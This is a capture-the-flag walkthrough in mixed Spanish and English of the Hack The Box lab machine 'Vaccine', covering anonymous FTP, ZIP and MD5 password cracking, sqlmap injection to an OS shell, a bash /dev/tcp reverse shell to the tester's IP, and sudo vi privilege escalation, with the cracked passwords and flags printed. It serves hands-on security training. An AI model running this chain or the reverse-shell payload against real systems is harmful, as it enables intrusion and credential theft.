@@ -1,0 +1,189 @@
+Hashtags :
+WebNetworkVulnerability Assessment Databases InjectionCustom ApplicationsProtocolsSource Code AnalysisApachePostgreSQLFTPPHPReconnaissancePassword CrackingSUDO ExploitationSQL InjectionRemote Code ExecutionClear Text CredentialsAnonymous/Guest Access   
+
+Empezamos con un nmap -sC sV 
+
+There are three ports open: 21 (FTP), 22 (SSH), 80 (HTTP). Since we don't have any credentials for the SSH
+service, we will start off with enumeration of the port 21, since the Nmap shows that it allows anonymous
+login:
+
+Nos conectamos por ftp 10.129.95.174
+vemos que hay un fichero backup.zip , lo descargamos con get backup.zip . Luego intentamos descomprimirlo con unzip pero nos pide una contraseña. 
+Vamos ahora intentar descifrarla usando John the Ripper
+In order to successfully crack the password, we will have to convert the ZIP into the hash using the
+zip2john module that comes within John the Ripper:
+
+zip2john backup.zip > hashes
+
+Now, we will type the following command:
+john -wordlist=/usr/share/wordlists/rockyou.txt hashes
+So it will load the wordlist & it will do a bruteforce attack against the hash stored in file hashes . Once the
+password is cracked, we will use the --show option to display the cracked password.
+
+❯ john -wordlist=/home/kali/SecLists/Passwords/Leaked-Databases/rockyou.txt hashes
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+741852963        (backup.zip)     
+1g 0:00:00:00 DONE (2023-12-19 06:30) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..total90
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+❯ john --show hashes
+backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
+
+1 password hash cracked, 0 left
+
+Ahora con la contraseña 741852963 podemos descomprimir el archivo backup.zip .
+Contiene 2 archivos index.php y style.css . 
+Abrimos index.php y vemos que nos da usuario admin y password 2cb42f8734ea607eefed3b70af13bbd3
+Por lo que tenemos que crackear ese hash, lo haremos con hashcat
+Usamos hashid para intentar identificar que tipo de hash es
+hashid 2cb42f8734ea607eefed3b70af13bbd3
+Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
+[+] MD2 
+[+] MD5 
+[+] MD4 
+[+] Double MD5 
+[+] LM 
+[+] RIPEMD-128 
+[+] Haval-128 
+[+] Tiger-128 
+[+] Skein-256(128) 
+[+] Skein-512(128) 
+[+] Lotus Notes/Domino 5 
+[+] Skype 
+[+] Snefru-128 
+[+] NTLM 
+[+] Domain Cached Credentials 
+[+] Domain Cached Credentials 2 
+[+] DNSSEC(NSEC3) 
+[+] RAdmin v2.x 
+
+It provides a huge list of possible hashes, however, we will go with MD5 first:
+We will put the hash in a text file called hash & then crack it with hashcat:
+
+hashcat -a 0 -m 0 hash /home/kali/SecLists/Passwords/Leaked-Databases/rockyou.txt
+
+hashcat pudo crackear el password qwerty789
+
+Ahora abrimos el navegador con el numero de ip de la maquina y nos abre una pagina web con un login, usamos admin y querty789 y obtuvimos acceso. 
+La pagina parece un catalogo y podria estar conectado a una base de datos. 
+Si cliqueamos en search, vemos que la url http://10.129.95.174/dashboard.php?search=
+crearemos cualquier query para probar
+
+So the dashboard has nothing special in it, however, it has a catalogue, which might be connected with the
+database. Let's create any query:
+By checking the URL, we can see that there is a variable $search which is responsible for searching through
+catalogue. We could test it to see if it's SQL injectable, but instead of doing it manually, we will use a tool
+called sqlmap 
+
+We will provide the URL & the cookie to the sqlmap in order for it to find vulnerability. The reason why we
+have to provide a cookie is because of authentication:
+To grab the cookie, we can intercept any request in Burp Suite & get it from there, however, you can install a
+great extension for your web browser called cookie-editor :
+
+
+The cookies in HTTP messages of requests are usually set the following way:
+PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1
+Knowing that, here's how our sqlmap syntax should look:
+
+sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=8i9gvkd5mbe3hdqb0vbdps0b5b"
+
+Out of this output, the thing that is important to us is the following:
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)?
+[y/N]
+The tool confirmed that the target is vulnerable to SQL injection, which is everything we needed to know. We
+will run the sqlmap once more, where we are going to provide the --os-shell flag, where we will be able
+to perform command injection:
+
+sqlmap -u 'http://10.129.109.70/dashboard.php?search=any+query' --cookie="PHPSESSID=0cr8m2jas3ijs2eq90qbqqno81" --os-shell
+
+We got the shell, however, it is not very stable & interactive. To make it much stable, we will use the
+following payload:
+bash -c "bash -i >& /dev/tcp/{ip de nuestra maquina, el que nos aparece de la vpn de HTB, no el nuestro de siempre}/443 0>&1"     bash -c "bash -i >& /dev/tcp/10.10.16.49/443 0>&1"
+dejamos en escucha con netcat el puerto 443
+sudo nc -lvnp 443
+
+y desde la shell que tenemos abierta ejecutamos el payload
+
+Obtuvimos acceso.
+La user flag estara en la carpeta postgres@vaccine:/var/lib/postgresql$ cat user.txt
+
+ec9b13ca4d6229cd5cc1e09980965bf7
+
+Ahora somos usuario postgres y no sabemos la contraseña, pero queremos escalar privilegios para llegar a root 
+We are user postgres , but we don't know the password for it, which means we cannot check our sudo
+privileges:
+
+
+We will try to find the password in the /var/www/html folder, since the machine uses both PHP & SQL,
+meaning that there should be credentials in clear text:
+
+postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www
+cd /var/www
+postgres@vaccine:/var/www$ cd html
+cd html
+postgres@vaccine:/var/www/html$ ls -la
+
+Abrimos el archivo dashboard.php y encontramos lo siguiente:
+
+user=postgres password=P@s5w0rd!
+
+Note that the shell might die all of a sudden, instead of re-doing the exploit all over again, we will use the
+SSH to log in
+
+postgres@10.129.109.70
+P@s5w0rd!
+
+We will type the sudo -l to see what privileges do we have:
+So we have sudo privileges to edit the pg_hba.conf file using vi by running sudo /bin/vi
+/etc/postgresql/11/main/pg_hba.conf . We will go to GTFOBins to see if we can abuse this privilege:
+https://gtfobins.github.io/gtfobins/vi/#sudo
+
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated
+privileges and may be used to access the file system, escalate or maintain privileged
+access.
+sudo vi -c ':!/bin/sh' /dev/null
+
+So we will execute it:
+
+postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh'
+/dev/null
+Sorry, user postgres is not allowed to execute '/bin/vi
+/etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh /dev/null' as root on vaccine.
+
+We are unable to execute the following command because sudo is restricted to only /bin/vi
+/etc/postgresql/11/main/pg_hba.conf .
+There's also an alternative way according to GTFOBins:
+
+vi
+:set shell=/bin/sh
+:shell
+
+So we will perform that as well:
+postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+We managed to open the vi editor as the superuser, which has root privileges:
+Now we will press the : button to set the instructions inside Vi :
+:set shell=/bin/sh
+
+Next, we will open up the same instruction interface & type the following:
+:shell
+
+After we execute the instructions, we will see the following:
+
+postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#
+
+The root flag can be obtained in the root folder:
+Note: Type bash to switch to /bin/bash shell:
+
+
+
+root flag:
+dd6e058e814260bc70e9bbdef2715849
